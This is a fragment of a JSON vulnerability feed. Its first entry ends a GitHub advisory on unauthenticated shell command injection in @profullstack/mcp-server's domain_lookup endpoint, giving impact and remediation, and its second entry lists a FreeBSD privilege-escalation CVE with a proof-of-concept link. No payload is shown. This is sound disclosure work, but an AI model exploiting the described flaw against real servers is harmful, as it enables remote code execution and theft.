500</h3>\n<p>Both requests return HTTP 500 because <code>tldx</code> is not installed in the test container. The injected commands are interpreted by the shell <strong>before</strong> <code>tldx</code> is invoked. The marker files confirm that attacker-controlled commands executed successfully despite the 500 response. In a production environment where <code>tldx</code> is installed, both the intended function and the injected commands execute.</p>\n<hr>\n<h2>Impact</h2>\n<ul>\n<li>Unauthenticated remote code execution as the server process UID.</li>\n<li>Full read/write access to any file the server process can access.</li>\n<li>Potential for outbound connections, credential theft, persistence, and lateral movement.</li>\n<li>Reproducible with a single unauthenticated HTTP POST to either of two documented endpoints.</li>\n</ul>\n<hr>\n<h2>Suggested Remediation</h2>\n<ol>\n<li>Replace <code>execAsync(command)</code> with <code>child_process.execFile</code> or <code>spawn('tldx', [keyword1, keyword2, ...])</code> \u2014 pass arguments as an array, never as a concatenated shell string.</li>\n<li>Validate all domain/keyword input against a strict allowlist (RFC 1035 hostname syntax) before invoking the external binary; reject any input containing shell metacharacters.</li>\n<li>Add a global authentication middleware so all HTTP-exposed modules are not callable anonymously.</li>\n<li>Default the server bind address to <code>127.0.0.1</code> and require explicit opt-in for non-loopback bindings.</li>\n</ol>\n<hr>\n<h2>Verification Environment</h2>\n<ul>\n<li>Local Docker container only; no third-party deployment was tested.</li>\n<li>The container does not include the <code>tldx</code> binary; this is intentional for safe local PoC and does not affect exploitability.</li>\n</ul></body></html><!--EndFragment-->\n</body>\n</html>",
+      "first_seen": "2026-05-09T03:53:09.835857+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-09T03:53:09.835857+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-v6wj-c83f-v46x",
+        "https://github.com/profullstack/mcp-server/security/advisories/GHSA-v6wj-c83f-v46x"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "@profullstack/mcp-server vulnerable to OS Command Injection in domain_lookup Module"
+    },
+    {
+      "canonical_id": "CVE-2026-7270",
+      "composite_confidence": 0.55,
+      "cwe": [],
+      "description": "CVE-2026-7270  FreeBSD local privilege escalation via exec_args_adjust_args OOB memmove",
+      "first_seen": "2026-05-09T03:53:12.880411+00:00",
+      "frameworks": [],
+      "key_kind": "cve",
+      "languages": [
+        "C"
+      ],
+      "last_seen": "2026-05-09T03:53:12.880411+00:00",
+      "merged_sources": [
+        "github_trending"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/babyshen/freebsd-CVE-2026-7270"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "freebsd-CVE-2026-7270"
+    }
+  ],
+  "correlated_at": "2026-05-09T03:53:14.579888+00:00"
 }
